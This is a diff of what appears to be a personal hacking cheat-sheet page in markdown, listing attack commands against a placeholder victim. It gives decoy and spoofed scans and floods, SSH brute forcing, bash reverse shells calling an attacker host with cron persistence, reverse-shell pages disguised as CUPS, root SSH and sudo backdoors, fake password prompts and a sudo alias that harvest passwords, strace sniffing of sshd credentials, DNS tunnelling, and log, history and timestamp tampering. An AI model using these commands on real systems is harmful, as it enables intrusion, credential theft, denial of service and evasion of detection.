@@ -42,19 +42,27 @@ Nmap is a network scanning tool.
 
 Scan 1000 most common ports. Delay is about 1 second.
 
-{% highlight shell %}# nmap --top-ports 1000 -T2 [victim ip address]{% endhighlight %}
+{% highlight shell %}
+# nmap --top-ports 1000 -T2 [victim ip address]
+{% endhighlight %}
 
 Scan all ports aggressively
 
-{% highlight shell %}# nmap -p- -T4 [victim ip address]{% endhighlight %}
+{% highlight shell %}
+# nmap -p- -T4 [victim ip address]
+{% endhighlight %}
 
 Try to determine Operation system. Scan 1000 most common ports and try to determine service and version.
 
-{% highlight shell %}# nmap -O -sV --top-ports 1000 -T4 [victim ip address]{% endhighlight %}
+{% highlight shell %}
+# nmap -O -sV --top-ports 1000 -T4 [victim ip address]
+{% endhighlight %}
 
 Scan insane fast in parallel and use decoys. In a target computer it looks like 3 different IP addresses are trying to scan it ports.
 
-{% highlight shell %}# nmap -p- -T5 --min-parallelism 5 [victim ip address zone] -D[decoy ip address],[decoy ip address]{% endhighlight %}
+{% highlight shell %}
+# nmap -p- -T5 --min-parallelism 5 [victim ip address zone] -D[decoy ip address],[decoy ip address]
+{% endhighlight %}
 
 ## Hydra
 
@@ -62,7 +70,9 @@ Hydra is a brute force tool.
 
 Brute forcing SSH account. Try to brute force 4 length password that contains only letters a and o. Delay is 1 second. Brute forcing is stopped if correct username and password is found.
 
-{% highlight shell %}# hydra -f -t 1 -l [username] -V -x 4:4:ao [victim ip address] ssh{% endhighlight %}
+{% highlight shell %}
+# hydra -f -t 1 -l [username] -V -x 4:4:ao [victim ip address] ssh
+{% endhighlight %}
 
 ## Slowhttptest
 
@@ -70,17 +80,23 @@ Slowlori attack is opening connections to HTTP server and keeps connections open
 
 Open 1000 connection and send only unfinished HTTP requests. Open 200 new connections per second and keep connections open by sending GET method in every 10 second with maximum length of 24 and wait 3 seconds for response.
 
-{% highlight shell %}# slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u http://[victim ip address or domain] -x 24 -p 3{% endhighlight %}
+{% highlight shell %}
+# slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u http://[victim ip address or domain] -x 24 -p 3
+{% endhighlight %}
 
 ## DOS
 
 Take lot of TCP connections to target
 
-{% highlight shell %}# nping --tcp-connect --rate=1000000 --count 1000000 [victim ip address or domain]{% endhighlight %}
+{% highlight shell %}
+# nping --tcp-connect --rate=1000000 --count 1000000 [victim ip address or domain]
+{% endhighlight %}
 
 Send much as possible TCP connections to target to port 21 and change source address to a decoy IP address. Flood by sending 10000 packets using SYN flag and data size is 120.
 
-{% highlight shell %}$ sudo hping3 -V -c 10000 -d 120 -S -p 21 --flood [victim ip address] -a [decoy ip address]{% endhighlight %}
+{% highlight shell %}
+$ sudo hping3 -V -c 10000 -d 120 -S -p 21 --flood [victim ip address] -a [decoy ip address]
+{% endhighlight %}
 
 # Reverse shells
 
@@ -88,22 +104,29 @@ Send much as possible TCP connections to target to port 21 and change source add
 
 In attacker's computer listen 51920 port using Netcat
 
-{% highlight shell %}# nc -l -p 51920{% endhighlight %}
+{% highlight shell %}
+# nc -l -p 51920
+{% endhighlight %}
 
 Victim is connecting to attacker and opening reverse shell
 
-{% highlight shell %}# /bin/bash -i >& /dev/tcp/[attacker ip address]/51920 0>&1{% endhighlight %}
+{% highlight shell %}
+# /bin/bash -i >& /dev/tcp/[attacker ip address]/51920 0>&1
+{% endhighlight %}
 
 You can also create a script that will try to open a reverse shell in every 5 minute
 
-{% highlight shell %}# nano /etc/cron.d/update_check
-*/5 * * * * root /bin/bash -c '/bin/bash -i >& /dev/tcp/[attacker ip address]/51920 0>&1'{% endhighlight %}
+{% highlight shell %}
+# nano /etc/cron.d/update_check
+*/5 * * * * root /bin/bash -c '/bin/bash -i >& /dev/tcp/[attacker ip address]/51920 0>&1'
+{% endhighlight %}
 
 ## Reverse shell using PHP site
 
 Install Apache and PHP to victim's computer and create PHP file that will open a reverse shell when the page is requested by HTTP protocol.
 
-{% highlight shell %}# apt install apache2 php libapache2-mod-php
+{% highlight shell %}
+# apt install apache2 php libapache2-mod-php
 # adduser www-data sudo
 # passwd www-data
 
@@ -116,24 +139,30 @@ Install Apache and PHP to victim's computer and create PHP file that will open a
 
 In attacker's computer listen 51920 port using Netcat and send HTTP request to malicious site. With HTTP request the victim's computer will open the reverse shell
 
-{% highlight shell %}# nc -l -p 51920
-# curl 'http://[victim ip address]/example.php?x=[attacker domain]&y=51920'{% endhighlight %}
+{% highlight shell %}
+# nc -l -p 51920
+# curl 'http://[victim ip address]/example.php?x=[attacker domain]&y=51920'
+{% endhighlight %}
 
 This is how you can give password using only one line example in reverse shell
 
-{% highlight shell %}$ echo 'password' | sudo -S command
+{% highlight shell %}
+$ echo 'password' | sudo -S command
 {% endhighlight %}
 
 ## Python site reverse shell and fake it to look like CUPS
 
 Give a sudo rights to user nobody without need to give a password
 
-{% highlight shell %}# nano /etc/sudoers.d/nobody
-nobody ALL=(ALL) NOPASSWD:ALL{% endhighlight %}
+{% highlight shell %}
+# nano /etc/sudoers.d/nobody
+nobody ALL=(ALL) NOPASSWD:ALL
+{% endhighlight %}
 
 Fake Python to look like CUPS, create a Python script and start a Python server
 
-{% highlight shell %}# python -V
+{% highlight shell %}
+# python -V
 Python 2.7.12
 
 # cp /usr/bin/python /usr/bin/cups
@@ -156,14 +185,16 @@ p=subprocess.call(["/bin/bash","-i"]);
 
 If you would NMAP victim's computer with default options it would look like ipp(CUPS) service is running
 
-{% highlight shell %}# nmap -p 631 [victim ip address]
+{% highlight shell %}
+# nmap -p 631 [victim ip address]
 PORT    STATE SERVICE
 631/tcp open  ipp
 {% endhighlight %}
 
 In attacker's computer listen 51920 port using Netcat and send HTTP request to malicious site
 
-{% highlight shell %}# nc -l -p 51920
+{% highlight shell %}
+# nc -l -p 51920
 # curl 'http://[victim ip address]:631/cgi-bin/index.py'
 {% endhighlight %}
 
@@ -173,28 +204,36 @@ In attacker's computer listen 51920 port using Netcat and send HTTP request to m
 
 Add PORT 2222 end of the /etc/ssh/sshd_config
 
-{% highlight shell %}# echo PORT 2222 >> /etc/ssh/sshd_config{% endhighlight %}
+{% highlight shell %}
+# echo PORT 2222 >> /etc/ssh/sshd_config
+{% endhighlight %}
 
 Restart SSH daemon
 
-{% highlight shell %}# service ssh restart{% endhighlight %}
+{% highlight shell %}
+# service ssh restart
+{% endhighlight %}
 
 Now you can take SSH to port 2222
 
-{% highlight shell %}# ssh [username]@[victim ip address] -p 2222{% endhighlight %}
+{% highlight shell %}
+# ssh [username]@[victim ip address] -p 2222
+{% endhighlight %}
 
 ## SSH Public Key Authentication
 
 Create key pair on hostile's computer, move public key to victim's computer and take SSH connection to it
 
-{% highlight shell %}# ssh-keygen
+{% highlight shell %}
+# ssh-keygen
 # ssh-copy-id [username]@[victim ip address]
 # ssh [username]@[victim ip address]
 {% endhighlight %}
 
 On victim's computer modify sshd_config allow the root to login, change SSH to find public keys also from /etc/ssh/authorized_keys and move public key to that location.
 
-{% highlight shell %}# nano /etc/ssh/sshd_config
+{% highlight shell %}
+# nano /etc/ssh/sshd_config
 PermitRootLogin yes
 AuthorizedKeysFile %h/.ssh/authorized_keys /etc/ssh/authorized_keys
 
@@ -208,18 +247,22 @@ AuthorizedKeysFile %h/.ssh/authorized_keys /etc/ssh/authorized_keys
 
 Now you can take SSH connection without password using root (or any other user) from hostile computer
 
-{% highlight shell %}# ssh root@[victim ip address]
+{% highlight shell %}
+# ssh root@[victim ip address]
 {% endhighlight %}
 
 ## Steal SSH password using bashrc
 
 Modify bash.bashrc so it looks like first password went wrong and you need to write it again, but actually it steals victim's password and adds it to a file
 
-{% highlight shell %}# nano /etc/bash.bashrc{% endhighlight %}
+{% highlight shell %}
+# nano /etc/bash.bashrc
+{% endhighlight %}
 
 Add these line to end of the bash.bashrc file
 
-{% highlight shell %}clear
+{% highlight shell %}
+clear
 echo "$(whoami)@$(hostname -I)'s password:"
 echo "Permission denied, please try again."
 read -s -p "$(whoami)@$(hostname -I)'s password: "  password
@@ -232,7 +275,8 @@ echo
 **This needs permanent solution to add alias and better way to do cut**  
 Create file that asks sudo password, runs the last command and steals the password and adds it to a file
 
-{% highlight shell %}# nano /bin/admin
+{% highlight shell %}
+# nano /bin/admin
 read -s -p "[sudo] password for $(whoami): "  password
 echo
 echo $password >> /tmp/sudo_password.txt
@@ -241,7 +285,8 @@ echo $password | /usr/bin/sudo -S $(history 1 | cut -c 13-)
 
 Give execute permissions to that file and give the script to sudo alias
 
-{% highlight shell %}# chmod +rx /bin/admin
+{% highlight shell %}
+# chmod +rx /bin/admin
 # alias sudo="/bin/admin"
 {% endhighlight %}
 
@@ -249,7 +294,8 @@ Now every time victim is running sudo [command] script asks password, steals the
 
 After this we can hide this alias modification by modifying the alias command
 
-{% highlight shell %}# alias > /bin/alias_old
+{% highlight shell %}
+# alias > /bin/alias_old
 # alias alias="cat /bin/alias_old"
 {% endhighlight %}
 
@@ -259,21 +305,28 @@ After this we can hide this alias modification by modifying the alias command
 
 Remove old history
 
-{% highlight shell %}# rm -r ~/.bash_history{% endhighlight %}
+{% highlight shell %}
+# rm -r ~/.bash_history
+{% endhighlight %}
 
 Clean session history and exit
 
-{% highlight shell %}# history -c && exit{% endhighlight %}
+{% highlight shell %}
+# history -c && exit
+{% endhighlight %}
 
 Link history to /dev/null so history does not save anything
 
-{% highlight shell %}# ln -sf /dev/null ~/.bash_history{% endhighlight %}
+{% highlight shell %}
+# ln -sf /dev/null ~/.bash_history
+{% endhighlight %}
 
 ## Clean logs
 
 Delete all useful log files
 
-{% highlight shell %}# rm -r /var/log/apache2
+{% highlight shell %}
+# rm -r /var/log/apache2
 # rm -r /var/log/apt
 # rm /var/log/mail*
 # rm /var/log/dpkg.log
@@ -285,39 +338,57 @@ Delete all useful log files
 
 Check a folder or a file creation and modification time
 
-{% highlight shell %}# stat [target folder/file]{% endhighlight %}
+{% highlight shell %}
+# stat [target folder/file]
+{% endhighlight %}
 
 Change a folder or a file creation and modification time to YYYYMMDDhhmm
 
-{% highlight shell %}# touch -t 201212211111 [target folder/file]{% endhighlight %}
+{% highlight shell %}
+# touch -t 201212211111 [target folder/file]
+{% endhighlight %}
 
 Change a folder or a file modification time to YYYYMMDDhhmm
 
-{% highlight shell %}# touch -mt 201212211111 [target folder/file]{% endhighlight %}
+{% highlight shell %}
+# touch -mt 201212211111 [target folder/file]
+{% endhighlight %}
 
 Copy creation and modification time from other file or folder
 
-{% highlight shell %}# touch [target folder/file] -r [source folder/file]{% endhighlight %}
+{% highlight shell %}
+# touch [target folder/file] -r [source folder/file]
+{% endhighlight %}
 
 List all files that has been changed in 7 days
 
-{% highlight shell %}# find [target folder] -iname "*" -atime -7 -type f{% endhighlight %}
+{% highlight shell %}
+# find [target folder] -iname "*" -atime -7 -type f
+{% endhighlight %}
 
 List all folders that has been changed in 7 days
 
-{% highlight shell %}# find [target folder] -iname "*" -atime -7 -type d{% endhighlight %}
+{% highlight shell %}
+# find [target folder] -iname "*" -atime -7 -type d
+{% endhighlight %}
 
 Change creation and modification time for all files that has been modified in 7 days
 
-{% highlight shell %}# touch -t 201212211111 $(find [target folder] -iname "*" -atime -7 -type f){% endhighlight %}
+{% highlight shell %}
+# touch -t 201212211111 $(find [target folder] -iname "*" -atime -7 -type f)
+{% endhighlight %}
 
 Change creation and modification time for all folders that has been modified in 7 days
 
-{% highlight shell %}# touch -t 201212211111 $(find [target folder] -iname "*" -atime -7 -type d){% endhighlight %}
+{% highlight shell %}
+# touch -t 201212211111 $(find [target folder] -iname "*" -atime -7 -type d)
+{% endhighlight %}
 
 Copy creation and modification time for all files that has been modified in 7 days. Source folder could be something like /bin
 
-{% highlight shell %}# touch $(find [target folder] -iname "*" -atime -7 -type f) -r [source folder/file]{% endhighlight %}
+{% highlight shell %}
+# touch $(find [target folder] -iname "*" -atime -7 -type f) -r [source folder/file]
+{% endhighlight %}
 
 # *******************************
 
@@ -327,7 +398,8 @@ Copy creation and modification time for all files that has been modified in 7 da
 
 ## Get SSH credentials using strace
 
-{% highlight shell %}$ sudo strace -f -p $(pgrep -o sshd) -o sniff.txt -e trace=write
+{% highlight shell %}
+$ sudo strace -f -p $(pgrep -o sshd) -o sniff.txt -e trace=write
 $ sudo /usr/bin/strace -f -p $(pgrep -o sshd) -e trace=write 2>&1 | grep '\\0\\0\\0\\4\|\\0\\0\\0\\10'
 $ /usr/bin/strace -f -p $(pgrep -o sshd) -e trace=write 2>&1 | grep --line-buffered '\\0\\0\\0\\5\|\\0\\0\\0\\10' >> tiedosto.txt
 $ /usr/bin/strace -f -p $(pgrep -o sshd) -e trace=write 2>&1 | grep --line-buffered -e "$(/bin/hostname)" -e '\\0\\0\\0\\10' >> tiedosto.txt
@@ -336,7 +408,8 @@ $ (/usr/bin/strace -f -p $(pgrep -o sshd) -e trace=write 2>&1 | grep --line-buff
 
 strace with reverse shell
 
-{% highlight shell %}$ sed -i -e 's/KillMode=process/KillMode=process\nExecStartPost=\/etc\/systemd\/system\/sshd.sh/g' /lib/systemd/system/ssh.service
+{% highlight shell %}
+$ sed -i -e 's/KillMode=process/KillMode=process\nExecStartPost=\/etc\/systemd\/system\/sshd.sh/g' /lib/systemd/system/ssh.service
 $ printf '#!/bin/bash\n/usr/bin/strace -f -p $MAINPID -e trace=write 2>&1 | grep --line-buffered -e "$(/bin/hostname)" -e ' > /etc/systemd/system/sshd.sh
 $ echo "'\\\\0\\\\0\\\\0\\\\10' >> /var/gnome.1 &" >> /etc/systemd/system/sshd.sh
 
@@ -347,7 +420,8 @@ $ service ssh restart
 
 strace with ssh
 
-{% highlight shell %}$ sudoedit /lib/systemd/system/ssh.service
+{% highlight shell %}
+$ sudoedit /lib/systemd/system/ssh.service
 ExecStartPost=/etc/systemd/system/sshd.sh
 
 $ sudoedit /etc/systemd/system/sshd.sh
@@ -361,7 +435,8 @@ $ service ssh restart
 
 grepping the password and username
 
-{% highlight shell %}$ cat sniff.txt | cut -d ' ' -f 4 | sort | uniq -c | sort -nr
+{% highlight shell %}
+$ cat sniff.txt | cut -d ' ' -f 4 | sort | uniq -c | sort -nr
 $ grep '\\0\\0\\0\\10' sniff.txt
 käyttäjä
 $ grep '\\0\\0\\0\\4' sniff.txt
@@ -370,21 +445,28 @@ $ grep '@computer' sniff.txt
 
 ## DNS tunneling
 
-{% highlight shell %}$ apt-get install iodine{% endhighlight %}
+{% highlight shell %}
+$ apt-get install iodine
+{% endhighlight %}
 
 Server to listen
 
-{% highlight shell %}# iodined -f -P 12345 [target ip address] [hostile domain]{% endhighlight %}
+{% highlight shell %}
+# iodined -f -P 12345 [target ip address] [hostile domain]
+{% endhighlight %}
 
 Client
 
-{% highlight shell %}$ sudo iodine -f -P 12345 -r [hostile domain]{% endhighlight %}
+{% highlight shell %}
+$ sudo iodine -f -P 12345 -r [hostile domain]
+{% endhighlight %}
 
 ## SPAM mail
 
 ## Windows create traffic using curl
 
-{% highlight shell %}set list=http://localhost1 http://localhost2
+{% highlight shell %}
+set list=http://localhost1 http://localhost2
 set list2=http://localhost3 http://localhost3
 
 :loop
